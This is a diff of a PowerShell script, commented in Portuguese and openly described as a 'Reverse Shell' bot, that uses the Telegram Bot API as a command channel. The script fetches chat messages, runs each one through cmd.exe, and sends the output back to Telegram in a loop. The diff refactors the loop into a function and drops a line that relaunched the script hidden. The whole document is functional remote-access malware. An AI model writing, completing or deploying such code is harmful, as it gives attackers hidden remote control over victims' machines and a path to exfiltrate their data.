@@ -13,42 +13,45 @@ function Send-Message {
     }
 }
 
-Send-Message ":robot: Bot de Reverse Shell iniciado! Envie um comando para começar."
+function Start-Bot {
+    Send-Message ":robot: Bot de Reverse Shell iniciado! Envie um comando para começar."
+    
+    while ($true) {
+        try {
+            # Obtém novas mensagens do Telegram
+            $updates = Invoke-RestMethod -Uri "$url/getUpdates?offset=$offset" -Method Get
 
-while ($true) {
-    try {
-        # Obtém novas mensagens do Telegram
-        $updates = Invoke-RestMethod -Uri "$url/getUpdates?offset=$offset" -Method Get
+            foreach ($update in $updates.result) {
+                $update_id = $update.update_id
+                $message = $update.message.text
 
-        foreach ($update in $updates.result) {
-            $update_id = $update.update_id
-            $message = $update.message.text
-
-            # Se ainda não capturamos o Chat ID, pegamos da primeira mensagem recebida
-            if ($chatID -eq $null) {
-                $chatID = $update.message.chat.id
-                Send-Message ":white_check_mark: Chat ID detectado automaticamente!"
-            }
-
-            if ($update_id -ge $offset) {
-                $offset = $update_id + 1  # Atualiza o offset para evitar repetição
-
-                # Executa o comando no cmd e captura a saída
-                $output = cmd.exe /c $message 2>&1
-                
-                # Converte a saída em string legível
-                if ($output -is [System.Array]) {
-                    $output = $output -join "`n"
+                # Se ainda não capturamos o Chat ID, pegamos da primeira mensagem recebida
+                if ($chatID -eq $null) {
+                    $chatID = $update.message.chat.id
+                    Send-Message ":white_check_mark: Chat ID detectado automaticamente!"
                 }
 
-                # Envia a saída do comando de volta ao Telegram
-                Send-Message $output
+                if ($update_id -ge $offset) {
+                    $offset = $update_id + 1  # Atualiza o offset para evitar repetição
+
+                    # Executa o comando no cmd e captura a saída
+                    $output = cmd.exe /c $message 2>&1
+                    
+                    # Converte a saída em string legível
+                    if ($output -is [System.Array]) {
+                        $output = $output -join "`n"
+                    }
+
+                    # Envia a saída do comando de volta ao Telegram
+                    Send-Message $output
+                }
             }
+        } catch {
+            Write-Host "Erro: $_"
         }
-    } catch {
-        Write-Host "Erro: $_"
+        Start-Sleep -Seconds 3  # Evita sobrecarga de requisições
     }
-    Start-Sleep -Seconds 3  # Evita sobrecarga de requisições
 }
 
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File caminho_do_script.ps1"
+# Chama a função Start-Bot para iniciar o bot
+Start-Bot
